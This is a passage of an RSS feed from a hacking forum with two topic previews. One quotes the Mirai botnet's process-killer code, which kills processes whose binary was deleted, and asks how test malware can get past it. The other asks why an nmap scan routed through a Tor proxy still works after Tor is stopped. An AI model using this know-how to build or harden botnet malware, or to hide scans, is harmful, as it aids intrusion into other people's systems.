          <source url="https://0x00sec.org/t/web-vulnerabilities-and-disclosure-revelations-unhealthy-habits/38206.rss">Web Vulnerabilities and Disclosure Revelations: Unhealthy Habits</source>
        </item>
        <item>
          <title>Malware Killed for &quot; (deleted)&quot; binary</title>
          <dc:creator><![CDATA[darad]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>my test malware got killed from another because delete the binary, there is a way to bypass this?<br>
or am I forced to keep the binary on the system?</p>
<p>this is the part of the code that kills my test malware, this source code is taken from Mirai malware on github.</p>
<p>(both were launched in the virtual machine)</p>
<p>complete code: <a href="https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c" rel="noopener nofollow ugc">https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c</a></p>
<pre><code class="lang-auto"> // Store /proc/$pid/exe into exe_path
            snprintf(exe_path, sizeof(exe_path), "/proc/%s/exe", file-&gt;d_name)


            // Resolve exe_path (/proc/$pid/exe) -&gt; realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

               // if the binary was deleted
                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf("[killer] Process '%s' has deleted binary!\n", realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            }
</code></pre>
            <p><small>24 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-killed-for-deleted-binary/38022</link>
          <pubDate>Wed, 22 Nov 2023 17:42:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38022</guid>
          <source url="https://0x00sec.org/t/malware-killed-for-deleted-binary/38022.rss">Malware Killed for &quot; (deleted)&quot; binary</source>
        </item>
        <item>
          <title>Nmap --proxies not working</title>
          <dc:creator><![CDATA[ADORE]]></dc:creator>
          <category>Reconnaissance</category>
          <description><![CDATA[
            <p>I  try to scan ports over tor using nmap<br>
It’s scaning the target.</p>
<p>nmap --proxies socks4://127.0.0.1:9050<br>
<a href="http://www.example.com" class="onebox" target="_blank" rel="noopener nofollow ugc">www.example.com</a></p>
<p>But when i stop tor service and then try to scan with same command its still working no error showing.</p>
<pre><code>   nmap --proxies socks4://127.0.0.1:9050 www.example.com
</code></pre>
<p>Why???<br>
Why???<br>
Whyyyyyyyyyyyyy???/??//?/???/??/???/???</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/nmap-proxies-not-working/37942">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/nmap-proxies-not-working/37942</link>
          <pubDate>Fri, 17 Nov 2023 08:50:08 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37942</guid>
          <source url="https://0x00sec.org/t/nmap-proxies-not-working/37942.rss">Nmap --proxies not working</source>
        </item>
  </channel>
</rss>
